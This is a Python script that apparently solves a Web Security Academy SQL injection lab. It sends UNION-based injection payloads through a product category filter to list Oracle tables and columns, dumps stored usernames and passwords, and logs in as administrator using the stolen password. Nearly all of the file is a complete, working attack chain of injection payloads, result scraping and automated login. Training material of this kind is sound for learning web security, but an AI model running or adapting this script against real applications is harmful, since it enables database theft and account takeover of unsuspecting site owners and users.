import requests
from bs4 import BeautifulSoup

BASE_URL = "https://0a4300810419427f801508c000d700bf.web-security-academy.net"  # Change

session = requests.Session()


def send_payload(sql_injection):
    response = session.get(
        BASE_URL + "/filter",
        params={"category": "Accessories" + sql_injection},
        timeout=10,
    )
    return BeautifulSoup(response.text, "html.parser")


def find_text_containing(soup, keyword):
    match = soup.find(
        string=lambda text: text and keyword.lower() in text.strip().lower()
    )
    return match.strip() if match else None


def find_all_text_containing(soup, keyword):
    matches = soup.find_all(
        string=lambda text: text and keyword.lower() in text.strip().lower()
    )
    return [match.strip() for match in matches]


def find_candidate_users_tables():
    print("[*] Step 1: looking for tables that look like 'USERS'...")

    payload = "' UNION SELECT table_name, NULL FROM all_tables-- "
    soup = send_payload(payload)

    table_names = find_all_text_containing(soup, "users")

    if not table_names:
        print("[-] Could not find any table with 'users' in its name.")
        return []

    print(f"[+] Found {len(table_names)} candidate table(s): {', '.join(table_names)}")
    return table_names


def find_username_password_columns(table_name):
    print(f"[*] Step 2: checking '{table_name}' for username/password columns...")

    payload = (
        "' UNION SELECT column_name, NULL FROM all_tab_columns "
        f"WHERE table_name = '{table_name}'-- "
    )
    soup = send_payload(payload)

    username_column = find_text_containing(soup, "username")
    password_column = find_text_containing(soup, "password")

    if not username_column or not password_column:
        print(f"    -> '{table_name}' doesn't have both columns, skipping.")
        return None, None

    print(f"[+] Found columns: {username_column}, {password_column}")
    return username_column, password_column


def dump_administrator_password(table_name, username_column, password_column):
    print("[*] Step 3: dumping credentials and looking for 'administrator'...")

    payload = f"' UNION SELECT {username_column}, {password_column} FROM {table_name}-- "
    soup = send_payload(payload)

    admin_cell = soup.find(
        string=lambda text: text and text.strip().lower() == "administrator"
    )
    if not admin_cell:
        print("[-] Could not find the 'administrator' user in the results.")
        return None

    password_cell = admin_cell.parent.find_next("td")
    if not password_cell:
        print("[-] Found 'administrator' but no password cell next to it.")
        return None

    admin_password = password_cell.get_text(strip=True)
    print(f"[+] Administrator password: {admin_password}")
    return admin_password


def login_as_administrator(password):
    print("[*] Step 4: logging in as administrator...")

    login_page = session.get(BASE_URL + "/login")
    login_soup = BeautifulSoup(login_page.text, "html.parser")

    csrf_input = login_soup.find("input", {"name": "csrf"})
    if not csrf_input:
        print("[-] Could not find CSRF token on the login page.")
        return False

    login_data = {
        "csrf": csrf_input["value"],
        "username": "administrator",
        "password": password,
    }
    session.post(BASE_URL + "/login", data=login_data)
    return True


def check_lab_solved():
    print("[*] Step 5: checking whether the lab is solved...")

    account_page = session.get(BASE_URL + "/my-account")
    if "Congratulations, you solved the lab!" in account_page.text:
        print("\n[SUCCESS] Lab solved!")
    else:
        print("\n[-] Lab not solved yet. Check the steps above for errors.")


def main():
    candidate_tables = find_candidate_users_tables()
    if not candidate_tables:
        return

    table_name = None
    username_column = password_column = None
    for candidate in candidate_tables:
        username_column, password_column = find_username_password_columns(candidate)
        if username_column and password_column:
            table_name = candidate
            break

    if not table_name:
        print("[-] None of the candidate tables had both username and password columns.")
        return

    admin_password = dump_administrator_password(table_name, username_column, password_column)
    if not admin_password:
        return

    if not login_as_administrator(admin_password):
        return

    check_lab_solved()


if __name__ == "__main__":
    main()

